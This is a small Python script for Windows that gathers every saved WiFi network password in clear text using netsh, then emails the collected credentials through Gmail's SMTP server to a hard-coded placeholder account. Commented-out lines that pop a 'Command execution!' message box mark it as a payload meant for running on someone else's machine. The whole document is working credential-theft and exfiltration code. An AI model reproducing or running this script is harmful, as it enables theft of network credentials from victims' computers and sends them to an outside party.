#!/usr/bin/env python3
import subprocess
import smtplib
import re


def main():
    send_mail('somegmail@gmail.com', 'passwordhere', get_wifi_passwords())


# Google's smtp is public for use.
# Less secure apps needs to be on for gmail.
def send_mail(email: str, password: str, message: str) -> None:
    server = smtplib.SMTP("smtp.gmail.com", port=587)
    server.starttls()
    server.login(user=email, password=password)
    server.sendmail(from_addr=email, to_addrs=email, msg=message)
    server.quit()


def get_wifi_passwords() -> str:
    """Windows only, search and grab clear-text WiFi network: password."""
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", str(networks))

    results = {}
    for network_name in network_names_list:
        command = f"netsh wlan show profile {network_name} key=clear"
        current_result = subprocess.check_output(command, shell=True)
        results[network_name] = (re.search(r"(?:Key Content\s*:\s)(.*)", str(current_result))
                                 .group(1))

    if results:
        return f"WiFi Network Credentials = {results}"
    else:
        return "This device has no saved WiFi networks."


# For 32 bit. For 64 bit can just do "msg * Command execution!"
# command = "%SystemRoot%\\Sysnative\\msg.exe *  Command execution!"
# subprocess.Popen(command, shell=True)
if __name__ == '__main__':
    main()
